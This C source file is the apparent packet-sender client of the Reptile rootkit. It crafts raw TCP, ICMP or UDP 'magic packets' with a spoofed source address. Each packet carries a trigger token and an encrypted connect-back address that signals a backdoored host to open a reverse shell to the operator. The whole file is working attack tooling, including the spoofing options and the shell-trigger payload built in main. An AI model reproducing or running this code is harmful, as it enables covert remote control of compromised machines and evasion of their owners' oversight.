#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "custom_rol32.h"
#include "util.h"

// Don't worry, it is gonna cahnged next version
#define KEY 0x6de56d3b
#define IPID 3429
#define SEQ 15123
#define WIN 9965

struct pseudohdr
{
	uint32_t saddr;
	uint32_t daddr;
	uint8_t zero;
	uint8_t protocol;
	uint16_t length;
};

unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	unsigned short odd;

	for (sum = 0; nwords > 1; nwords-=2)
		sum += *buf++;

	if (nwords == 1) {
		odd = 0;
		*((unsigned char *)&odd) = *(unsigned char *)buf;
		sum += odd;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return ~sum;
}

int tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data, unsigned int data_len)
{
	int socktcp, nbytes, ret = EXIT_FAILURE;
	unsigned int pckt_tam, plen;
	char *buffer;
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct sockaddr_in s;
	socklen_t optval = 1;
	struct pseudohdr psh;
	char *pseudo_packet;

	pckt_tam = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;

	if (!(buffer = (char *)malloc(pckt_tam))) {
		fatal("on allocating buffer memory");
		return ret;
	}

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	tcph = (struct tcphdr *)(buffer + sizeof(struct iphdr));

	if ((socktcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		fatal("on creating TCP socket");
		goto free_buffer;
	}

	if (setsockopt(socktcp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
		fatal("on setsockopt");
		goto close_socket;
	}

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(IPID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->tot_len = pckt_tam;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);

	//iph->check = csum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph->check = csum((unsigned short *)buffer, iph->tot_len);

	tcph->source = htons(srcport);
	tcph->dest = htons(dstport);
	tcph->seq = 0x0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(WIN);
	tcph->urg_ptr = 0;
	tcph->check = 0;

	psh.saddr = inet_addr(srcip);
	psh.daddr = inet_addr(dstip);
	psh.zero = 0;
	psh.protocol = IPPROTO_TCP;
	psh.length = htons(sizeof(struct tcphdr) + data_len);

	plen = sizeof(struct pseudohdr) + sizeof(struct tcphdr) + data_len;

	if ((pseudo_packet = malloc(plen)) == NULL) {
		fatal("on malloc");
		goto close_socket;
	}

	bzero(pseudo_packet, plen);
	memcpy(pseudo_packet, &psh, sizeof(struct pseudohdr));

	tcph->seq = htons(SEQ);
	tcph->check = 0;
	memcpy(pseudo_packet + sizeof(struct pseudohdr), tcph, sizeof(struct tcphdr) + data_len);
	tcph->check = csum((unsigned short *)pseudo_packet, plen);

	s.sin_family = AF_INET;
	s.sin_port = htons(dstport);
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(socktcp, buffer, iph->tot_len, 0, (struct sockaddr *)&s, sizeof(struct sockaddr))) == -1)
		fatal("on sending package");

	if (nbytes > 0) {
		fprintf(stdout, "%s TCP: %u bytes was sent!\n", good, nbytes);
		ret = EXIT_SUCCESS;
	}
	
	free(pseudo_packet);
close_socket:
	close(socktcp);
free_buffer:
	free(buffer);
	return ret;
}

int icmp(char *srcip, char *dstip, char *data, unsigned int data_len)
{
	int sockicmp, nbytes, ret = EXIT_FAILURE;
	unsigned int pckt_tam;
	char *buffer;
	struct iphdr *iph;
	struct icmphdr *icmp;
	struct sockaddr_in s;
	socklen_t optval = 1;

	pckt_tam = (sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);

	if (!(buffer = (char *)malloc(pckt_tam))) {
		fatal("on allocating buffer memory");
		return ret;
	}

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));

	if ((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
		fatal("in creating raw ICMP socket");
		goto free_buffer;
	}

	if (setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
		fatal("in setsockopt");
		goto close_socket;
	}

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct icmphdr)), data, data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(IPID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_ICMP;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);
	iph->tot_len = pckt_tam;
	iph->check = csum((unsigned short *)buffer, iph->tot_len);

	icmp->type = 8;
	icmp->code = ICMP_ECHO;
	icmp->checksum = 0;
	icmp->un.echo.id = htons(WIN);
	icmp->un.echo.sequence = htons(SEQ);

	icmp->checksum = csum((unsigned short *)icmp, sizeof(struct icmphdr) + data_len);

	s.sin_family = AF_INET;
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *)&s, sizeof(struct sockaddr))) == -1)
		fatal("on sending package");

	if (nbytes > 0) {
		fprintf(stdout, "%s ICMP: %u bytes was sent!\n", good, nbytes);
		ret = EXIT_SUCCESS;
	}
	
close_socket:
	close(sockicmp);
free_buffer:
	free(buffer);
	return ret;
}

int udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data, unsigned int data_len)
{
	int sockudp, nbytes, ret = EXIT_FAILURE;
	unsigned int pckt_tam, plen;
	char *buffer;
	struct iphdr *iph;
	struct udphdr *udph;
	struct sockaddr_in s;
	socklen_t optval = 1;
	struct pseudohdr psh;
	char *pseudo_packet;

	pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;

	if (!(buffer = (char *)malloc(pckt_tam))) {
		fatal("on allocating buffer memory");
		return ret;
	}

	memset(buffer, '\0', pckt_tam);

	iph = (struct iphdr *)buffer;
	udph = (struct udphdr *)(buffer + sizeof(struct iphdr));

	if ((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
		fatal("on creating UDP socket");
		goto free_buffer;
	}

	if (setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
		fatal("on setsockopt");
		goto close_socket;
	}

	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct udphdr)), data, data_len);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htons(IPID);
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->tot_len = pckt_tam;
	iph->saddr = inet_addr(srcip);
	iph->daddr = inet_addr(dstip);
	iph->check = csum((unsigned short *)buffer, iph->tot_len);

	udph->source = htons(srcport);
	udph->dest = htons(dstport);
	udph->len = htons(sizeof(struct udphdr) + data_len);
	udph->check = 0;
	
	psh.saddr = inet_addr(srcip);
	psh.daddr = inet_addr(dstip);
	psh.zero = 0;
	psh.protocol = IPPROTO_UDP;
	psh.length = htons(sizeof(struct udphdr) + data_len);

	plen = sizeof(struct pseudohdr) + sizeof(struct udphdr) + data_len;

	if ((pseudo_packet = malloc(plen)) == NULL) {
		fatal("on malloc");
		goto close_socket;
	}

	bzero(pseudo_packet, plen);
	memcpy(pseudo_packet, &psh, sizeof(struct pseudohdr));

	udph->check = 0;
	memcpy(pseudo_packet + sizeof(struct pseudohdr), udph, sizeof(struct udphdr) + data_len);
	udph->check = csum((unsigned short *)pseudo_packet, plen);

	//fprintf(stdout, "UDP Checksum = 0x%x\n", htons(udph->check));

	s.sin_family = AF_INET;
	s.sin_port = htons(dstport);
	s.sin_addr.s_addr = inet_addr(dstip);

	if ((nbytes = sendto(sockudp, buffer, iph->tot_len, 0, (struct sockaddr *)&s, sizeof(struct sockaddr))) == -1)
		fatal("on sending package");
	
	if (nbytes > 0) {
		fprintf(stdout, "%s UDP: %u bytes was sent!\n", good, nbytes);
		ret = EXIT_SUCCESS;
	}

	free(pseudo_packet);
close_socket:
	close(sockudp);
free_buffer:
	free(buffer);
	return ret;
}

void usage(char *argv0)
{
	fprintf(stderr, "\n\e[01;32mReptile Packet Sender\e[00m\n");
	fprintf(stderr, "\e[01;31mWritten by F0rb1dd3n\e[00m\n");
	fprintf(stderr, "\nUsage: %s [options]\n\n", argv0);
	fprintf(stderr, "-t\tTarget\n");
	fprintf(stderr, "-r\tRemote port from magic packets (only for tcp/udp)\n");
	fprintf(stderr, "-x\tMagic Packet protocol (tcp/icmp/udp)\n");
	fprintf(stderr, "-s\tSource IP address to spoof\n");
	fprintf(stderr, "-q\tSource port from magic packets (only for tcp/udp)\n");
	fprintf(stderr, "-l\tHost to receive the reverse shell\n");
	fprintf(stderr, "-p\tHost port to receive the reverse shell\n");
	fprintf(stderr, "-k\tToken to trigger the port-knocking\n\n");
	exit(1);
}

int main(int argc, char **argv)
{
	int opt, dstport, srcport, len, crypt_len;
	char *prot, *dstip, *srcip, *connect_back_host, *connect_back_port,
	    *token, *data;

	dstport = srcport = 0;

	prot = dstip = srcip = connect_back_host = connect_back_port = token =
	    NULL;

	while ((opt = getopt(argc, argv, "x:t:l:p:r:s:q:k:")) != EOF) {
		switch (opt) {
		case 'x':
			prot = optarg;
			if (strcmp(prot, "icmp") == 0 ||
			    strcmp(prot, "ICMP") == 0) {
				if (strcmp(prot, "udp") == 0 ||
				    strcmp(prot, "UDP") == 0) {
					if (strcmp(prot, "tcp") == 0 ||
					    strcmp(prot, "TCP") == 0) {
						printf("%s wrong "
						       "protocol\n",
						       bad);
						exit(-1);
					}
				}
			}
			break;
		case 't':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			dstip = optarg;
			break;
		case 'l':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			connect_back_host = optarg;
			break;
		case 'p':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			connect_back_port = optarg;
			break;
		case 'r':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			dstport = atoi(optarg);
			break;
		case 's':
			if (strlen(optarg) > 15) {
				printf("%s wrong IP address\n", bad);
				exit(-1);
			}
			srcip = optarg;
			break;
		case 'q':
			if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
				printf("%s wrong port\n", bad);
				exit(-1);
			}
			srcport = atoi(optarg);
			break;
		case 'k':
			if (strlen(optarg) > 16 || strlen(optarg) < 5) {
				printf("%s wrong size of token\n", bad);
				exit(-1);
			}
			token = optarg;
			break;
		default:
			usage(argv[0]);
			break;
		}
	}

	if (prot == NULL || dstip == NULL || srcip == NULL ||
	    connect_back_host == NULL || connect_back_port == NULL ||
	    token == NULL) {
		usage(argv[0]);
	}

	if (strcmp(prot, "tcp") == 0 || strcmp(prot, "udp") == 0 ||
	    strcmp(prot, "TCP") == 0 || strcmp(prot, "UDP") == 0) {
		if (srcport == 0 || dstport == 0)
			usage(argv[0]);
	}

		
	len = strlen(token) + strlen(connect_back_host) + strlen(connect_back_port) + 3;
	crypt_len = strlen(connect_back_host) + strlen(connect_back_port) + 2;
	data = (char *)malloc(len);

	if (!data)
		fatal("malloc");

	bzero(data, len);
	snprintf(data, len, "%s %s %s", token, connect_back_host, connect_back_port);
	do_encrypt(data + strlen(token) + 1, crypt_len, KEY);

	// printf("data size: %d\n", len);

	if (strcmp(prot, "tcp") == 0 || strcmp(prot, "TCP") == 0) {
		tcp(srcip, dstip, srcport, dstport, data, len);
	} else if (strcmp(prot, "icmp") == 0 || strcmp(prot, "ICMP") == 0) {
		icmp(srcip, dstip, data, len);
	} else if (strcmp(prot, "udp") == 0 || strcmp(prot, "UDP") == 0) {
		udp(srcip, dstip, srcport, dstport, data, len);
	}

	free(data);
	return EXIT_SUCCESS;
}
